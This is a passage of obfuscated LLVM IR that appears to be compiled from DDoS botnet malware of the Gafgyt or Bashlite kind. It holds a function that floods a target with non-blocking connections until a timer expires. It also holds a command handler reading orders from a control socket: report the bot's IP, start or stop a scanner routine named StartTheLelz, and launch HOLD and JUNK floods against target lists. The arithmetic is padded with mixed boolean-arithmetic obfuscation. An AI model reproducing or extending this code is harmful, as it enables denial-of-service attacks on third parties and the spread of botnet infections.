  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %311

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 %47, %49
  %51 = add nsw i32 %47, %48
  store i32 %50, i32* %17, align 4
  br label %52

; <label>:52:                                     ; preds = %308, %34
  %53 = load i32, i32* %17, align 4
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = icmp sgt i32 %53, %54
  br i1 %55, label %56, label %309

; <label>:56:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %303, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %308

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %302 [
    i32 0, label %68
    i32 1, label %127
    i32 2, label %229
  ]

; <label>:68:                                     ; preds = %61
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null)
  %85 = xor i32 %84, -1
  %86 = xor i32 2048, -1
  %87 = xor i32 -2091013057, -1
  %88 = and i32 %85, -2091013057
  %89 = and i32 %84, %87
  %90 = and i32 %86, -2091013057
  %91 = and i32 2048, %87
  %92 = or i32 %88, %89
  %93 = or i32 %90, %91
  %94 = xor i32 %92, %93
  %95 = or i32 %85, %86
  %96 = xor i32 %95, -1
  %97 = or i32 -2091013057, %87
  %98 = and i32 %96, %97
  %99 = or i32 %94, %98
  %100 = or i32 %84, 2048
  %101 = call i32 (i32, i32, ...) @fcntl(i32 %78, i32 4, i32 %99)
  %102 = load i32, i32* %8, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %103
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 8
  %107 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %108 = call i32 @connect(i32 %106, %struct.sockaddr* %107, i32 16)
  %109 = icmp ne i32 %108, -1
  br i1 %109, label %114, label %110

; <label>:110:                                    ; preds = %68
  %111 = call i32* @__errno_location() #13
  %112 = load i32, i32* %111, align 4
  %113 = icmp ne i32 %112, 115
  br i1 %113, label %114, label %121

; <label>:114:                                    ; preds = %110, %68
  %115 = load i32, i32* %8, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %116
  %118 = getelementptr inbounds %struct.state_t, %struct.state_t* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  %120 = call i32 @close(i32 %119)
  br label %126

; <label>:121:                                    ; preds = %110
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 1
  store i8 1, i8* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %121, %114
  br label %302

; <label>:127:                                    ; preds = %61
  br label %128

; <label>:128:                                    ; preds = %127
  %129 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %130 = getelementptr inbounds [16 x i64], [16 x i64]* %129, i64 0, i64 0
  %131 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %130) #2, !srcloc !7
  %132 = extractvalue { i64, i64* } %131, 0
  %133 = extractvalue { i64, i64* } %131, 1
  %134 = trunc i64 %132 to i32
  store i32 %134, i32* %18, align 4
  %135 = ptrtoint i64* %133 to i64
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %19, align 4
  br label %137

; <label>:137:                                    ; preds = %128
  br label %138

; <label>:138:                                    ; preds = %137
  %139 = load i32, i32* %8, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %140
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = srem i32 %143, 64
  %145 = zext i32 %144 to i64
  %146 = shl i64 1, %145
  %147 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %149
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = sdiv i32 %152, 64
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [16 x i64], [16 x i64]* %147, i64 0, i64 %154
  %156 = load i64, i64* %155, align 8
  %157 = xor i64 %156, -1
  %158 = xor i64 %146, -1
  %159 = xor i64 871294351175835749, -1
  %160 = and i64 %157, 871294351175835749
  %161 = and i64 %156, %159
  %162 = and i64 %158, 871294351175835749
  %163 = and i64 %146, %159
  %164 = or i64 %160, %161
  %165 = or i64 %162, %163
  %166 = xor i64 %164, %165
  %167 = or i64 %157, %158
  %168 = xor i64 %167, -1
  %169 = or i64 871294351175835749, %159
  %170 = and i64 %168, %169
  %171 = or i64 %166, %170
  %172 = or i64 %156, %146
  store i64 %171, i64* %155, align 8
  %173 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %173, align 8
  %174 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %174, align 8
  %175 = load i32, i32* %8, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %176
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = sub i32 0, 1
  %181 = sub i32 %179, %180
  %182 = add nsw i32 %179, 1
  %183 = call i32 @select(i32 %181, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %183, i32* %15, align 4
  %184 = load i32, i32* %15, align 4
  %185 = icmp eq i32 %184, 1
  br i1 %185, label %186, label %213

; <label>:186:                                    ; preds = %138
  store i32 4, i32* %13, align 4
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = bitcast i32* %14 to i8*
  %193 = call i32 @getsockopt(i32 %191, i32 1, i32 4, i8* %192, i32* %13) #2
  %194 = load i32, i32* %14, align 4
  %195 = icmp ne i32 %194, 0
  br i1 %195, label %196, label %207

; <label>:196:                                    ; preds = %186
  %197 = load i32, i32* %8, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %198
  %200 = getelementptr inbounds %struct.state_t, %struct.state_t* %199, i32 0, i32 0
  %201 = load i32, i32* %200, align 8
  %202 = call i32 @close(i32 %201)
  %203 = load i32, i32* %8, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %204
  %206 = getelementptr inbounds %struct.state_t, %struct.state_t* %205, i32 0, i32 1
  store i8 0, i8* %206, align 4
  br label %212

; <label>:207:                                    ; preds = %186
  %208 = load i32, i32* %8, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %209
  %211 = getelementptr inbounds %struct.state_t, %struct.state_t* %210, i32 0, i32 1
  store i8 2, i8* %211, align 4
  br label %212

; <label>:212:                                    ; preds = %207, %196
  br label %228

; <label>:213:                                    ; preds = %138
  %214 = load i32, i32* %15, align 4
  %215 = icmp eq i32 %214, -1
  br i1 %215, label %216, label %227

; <label>:216:                                    ; preds = %213
  %217 = load i32, i32* %8, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %218
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 8
  %222 = call i32 @close(i32 %221)
  %223 = load i32, i32* %8, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 1
  store i8 0, i8* %226, align 4
  br label %227

; <label>:227:                                    ; preds = %216, %213
  br label %228

; <label>:228:                                    ; preds = %227, %212
  br label %302

; <label>:229:                                    ; preds = %61
  br label %230

; <label>:230:                                    ; preds = %229
  %231 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %232 = getelementptr inbounds [16 x i64], [16 x i64]* %231, i64 0, i64 0
  %233 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %232) #2, !srcloc !8
  %234 = extractvalue { i64, i64* } %233, 0
  %235 = extractvalue { i64, i64* } %233, 1
  %236 = trunc i64 %234 to i32
  store i32 %236, i32* %20, align 4
  %237 = ptrtoint i64* %235 to i64
  %238 = trunc i64 %237 to i32
  store i32 %238, i32* %21, align 4
  br label %239

; <label>:239:                                    ; preds = %230
  br label %240

; <label>:240:                                    ; preds = %239
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = srem i32 %245, 64
  %247 = zext i32 %246 to i64
  %248 = shl i64 1, %247
  %249 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %250 = load i32, i32* %8, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %251
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 8
  %255 = sdiv i32 %254, 64
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %249, i64 0, i64 %256
  %258 = load i64, i64* %257, align 8
  %259 = xor i64 %258, -1
  %260 = xor i64 %248, -1
  %261 = xor i64 3504052827147376557, -1
  %262 = and i64 %259, 3504052827147376557
  %263 = and i64 %258, %261
  %264 = and i64 %260, 3504052827147376557
  %265 = and i64 %248, %261
  %266 = or i64 %262, %263
  %267 = or i64 %264, %265
  %268 = xor i64 %266, %267
  %269 = or i64 %259, %260
  %270 = xor i64 %269, -1
  %271 = or i64 3504052827147376557, %261
  %272 = and i64 %270, %271
  %273 = or i64 %268, %272
  %274 = or i64 %258, %248
  store i64 %273, i64* %257, align 8
  %275 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %275, align 8
  %276 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %276, align 8
  %277 = load i32, i32* %8, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %278
  %280 = getelementptr inbounds %struct.state_t, %struct.state_t* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 8
  %282 = sub i32 0, %281
  %283 = sub i32 0, 1
  %284 = add i32 %282, %283
  %285 = sub i32 0, %284
  %286 = add nsw i32 %281, 1
  %287 = call i32 @select(i32 %285, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %287, i32* %15, align 4
  %288 = load i32, i32* %15, align 4
  %289 = icmp ne i32 %288, 0
  br i1 %289, label %290, label %301

; <label>:290:                                    ; preds = %240
  %291 = load i32, i32* %8, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %292
  %294 = getelementptr inbounds %struct.state_t, %struct.state_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 8
  %296 = call i32 @close(i32 %295)
  %297 = load i32, i32* %8, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %298
  %300 = getelementptr inbounds %struct.state_t, %struct.state_t* %299, i32 0, i32 1
  store i8 0, i8* %300, align 4
  br label %301

; <label>:301:                                    ; preds = %290, %240
  br label %302

; <label>:302:                                    ; preds = %301, %228, %126, %61
  br label %303

; <label>:303:                                    ; preds = %302
  %304 = load i32, i32* %8, align 4
  %305 = sub i32 0, 1
  %306 = sub i32 %304, %305
  %307 = add nsw i32 %304, 1
  store i32 %306, i32* %8, align 4
  br label %57

; <label>:308:                                    ; preds = %57
  br label %52

; <label>:309:                                    ; preds = %52
  %310 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %310)
  br label %311

; <label>:311:                                    ; preds = %309, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #10
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %48, label %45

; <label>:45:                                     ; preds = %2
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = call i32 (i32, i8*, ...) @sockprintf(i32 %46, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i32 0, i32 0))
  br label %699

; <label>:48:                                     ; preds = %2
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* %51, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i32 0, i32 0)) #10
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %59, label %54

; <label>:54:                                     ; preds = %48
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i8* @inet_ntoa(i32 %56) #2
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %57)
  br label %699

; <label>:59:                                     ; preds = %48
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 0
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i32 0, i32 0)) #10
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %111, label %65

; <label>:65:                                     ; preds = %59
  %66 = load i32, i32* %3, align 4
  %67 = icmp ne i32 %66, 2
  br i1 %67, label %68, label %71

; <label>:68:                                     ; preds = %65
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 %69, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.94, i32 0, i32 0))
  br label %699

; <label>:71:                                     ; preds = %65
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @strcmp(i8* %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %86, label %77

; <label>:77:                                     ; preds = %71
  %78 = load i32, i32* @scanPid, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %77
  br label %699

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #2
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %86

; <label>:86:                                     ; preds = %81, %71
  %87 = load i8**, i8*** %4, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @strcmp(i8* %89, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.97, i32 0, i32 0)) #10
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %110, label %92

; <label>:92:                                     ; preds = %86
  %93 = load i32, i32* @scanPid, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %92
  br label %699

; <label>:96:                                     ; preds = %92
  %97 = call i32 @fork() #2
  store i32 %97, i32* %6, align 4
  %98 = load i32, i32* %6, align 4
  %99 = icmp ugt i32 %98, 0
  br i1 %99, label %100, label %102

; <label>:100:                                    ; preds = %96
  %101 = load i32, i32* %6, align 4
  store i32 %101, i32* @scanPid, align 4
  br label %699

; <label>:102:                                    ; preds = %96
  %103 = load i32, i32* %6, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %102
  br label %699

; <label>:106:                                    ; preds = %102
  br label %107

; <label>:107:                                    ; preds = %106
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 %108, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.98, i32 0, i32 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:110:                                    ; preds = %86
  br label %111

; <label>:111:                                    ; preds = %110, %59
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 0
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @strcmp(i8* %114, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0)) #10
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %173, label %117

; <label>:117:                                    ; preds = %111
  %118 = load i32, i32* %3, align 4
  %119 = icmp slt i32 %118, 4
  br i1 %119, label %132, label %120

; <label>:120:                                    ; preds = %117
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 2
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* %123) #10
  %125 = icmp slt i32 %124, 1
  br i1 %125, label %132, label %126

; <label>:126:                                    ; preds = %120
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 3
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #10
  %131 = icmp slt i32 %130, 1
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %126, %120, %117
  br label %699

; <label>:133:                                    ; preds = %126
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  store i8* %136, i8** %7, align 8
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #10
  store i32 %140, i32* %8, align 4
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  store i32 %144, i32* %9, align 4
  %145 = load i8*, i8** %7, align 8
  %146 = call i8* @strstr(i8* %145, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %147 = icmp ne i8* %146, null
  br i1 %147, label %148, label %164

; <label>:148:                                    ; preds = %133
  %149 = load i8*, i8** %7, align 8
  %150 = call i8* @strtok(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %150, i8** %10, align 8
  br label %151

; <label>:151:                                    ; preds = %161, %148
  %152 = load i8*, i8** %10, align 8
  %153 = icmp ne i8* %152, null
  br i1 %153, label %154, label %163

; <label>:154:                                    ; preds = %151
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %161, label %157

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %10, align 8
  %159 = load i32, i32* %8, align 4
  %160 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:161:                                    ; preds = %154
  %162 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %162, i8** %10, align 8
  br label %151

; <label>:163:                                    ; preds = %151
  br label %172

; <label>:164:                                    ; preds = %133
  %165 = call i32 @listFork()
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %168

; <label>:167:                                    ; preds = %164
  br label %699

; <label>:168:                                    ; preds = %164
  %169 = load i8*, i8** %7, align 8
  %170 = load i32, i32* %8, align 4
  %171 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %169, i32 %170, i32 %171)
  call void @_exit(i32 0) #12
  unreachable

; <label>:172:                                    ; preds = %163
  br label %173

; <label>:173:                                    ; preds = %172, %111
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 0
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @strcmp(i8* %176, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i32 0, i32 0)) #10
  %178 = icmp ne i32 %177, 0
  br i1 %178, label %237, label %179

; <label>:179:                                    ; preds = %173
  %180 = load i32, i32* %3, align 4
  %181 = icmp slt i32 %180, 4
  br i1 %181, label %194, label %182

; <label>:182:                                    ; preds = %179
  %183 = load i8**, i8*** %4, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 2
  %185 = load i8*, i8** %184, align 8
  %186 = call i32 @atoi(i8* %185) #10
  %187 = icmp slt i32 %186, 1
  br i1 %187, label %194, label %188

; <label>:188:                                    ; preds = %182
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 3
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @atoi(i8* %191) #10
  %193 = icmp slt i32 %192, 1
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %188, %182, %179
  br label %699

; <label>:195:                                    ; preds = %188
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 1
  %198 = load i8*, i8** %197, align 8
  store i8* %198, i8** %11, align 8
  %199 = load i8**, i8*** %4, align 8
  %200 = getelementptr inbounds i8*, i8** %199, i64 2
  %201 = load i8*, i8** %200, align 8
  %202 = call i32 @atoi(i8* %201) #10
  store i32 %202, i32* %12, align 4
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 3
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  store i32 %206, i32* %13, align 4
  %207 = load i8*, i8** %11, align 8
  %208 = call i8* @strstr(i8* %207, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %209 = icmp ne i8* %208, null
  br i1 %209, label %210, label %228

; <label>:210:                                    ; preds = %195
  %211 = load i8*, i8** %11, align 8
  %212 = call i8* @strtok(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %212, i8** %14, align 8
  br label %213

; <label>:213:                                    ; preds = %225, %210
  %214 = load i8*, i8** %14, align 8
  %215 = icmp ne i8* %214, null
  br i1 %215, label %216, label %227

; <label>:216:                                    ; preds = %213
  %217 = call i32 @listFork()
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %225, label %219

; <label>:219:                                    ; preds = %216
  %220 = load i8*, i8** %14, align 8
  %221 = load i32, i32* %12, align 4
  %222 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %220, i32 %221, i32 %222)
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = call i32 @close(i32 %223)
  call void @_exit(i32 0) #12
  unreachable

; <label>:225:                                    ; preds = %216
  %226 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %226, i8** %14, align 8
  br label %213

; <label>:227:                                    ; preds = %213
  br label %236

; <label>:228:                                    ; preds = %195
  %229 = call i32 @listFork()
  %230 = icmp ne i32 %229, 0
  br i1 %230, label %231, label %232

; <label>:231:                                    ; preds = %228
  br label %699

; <label>:232:                                    ; preds = %228
  %233 = load i8*, i8** %11, align 8
  %234 = load i32, i32* %12, align 4
  %235 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %233, i32 %234, i32 %235)
  call void @_exit(i32 0) #12
  unreachable

; <label>:236:                                    ; preds = %227
  br label %237

; <label>:237:                                    ; preds = %236, %173
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 0
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @strcmp(i8* %240, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %340, label %243

; <label>:243:                                    ; preds = %237
  %244 = load i32, i32* %3, align 4
  %245 = icmp slt i32 %244, 6
  br i1 %245, label %279, label %246

; <label>:246:                                    ; preds = %243
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 3
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @atoi(i8* %249) #10
  %251 = icmp eq i32 %250, -1
  br i1 %251, label %279, label %252

